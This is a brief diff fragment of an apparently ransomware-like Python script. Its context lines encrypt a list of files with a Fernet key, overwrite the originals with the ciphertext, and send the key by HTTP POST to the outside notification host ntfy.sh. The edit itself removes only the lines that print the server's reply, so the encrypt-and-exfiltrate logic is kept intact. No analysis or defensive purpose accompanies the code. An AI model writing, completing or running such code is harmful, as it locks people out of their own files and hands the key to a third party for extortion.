@@ -15,8 +15,5 @@ for file in files:
     enc_content = Fernet(key).encrypt(content)
     with open(file, "wb") as enc_file: enc_file.write(enc_content)
 
-
 conn = HTTPConnection("ntfy.sh", 80)
 conn.request("POST", '/test', key)
-response = conn.getresponse()
-print(response.status, response.reason)
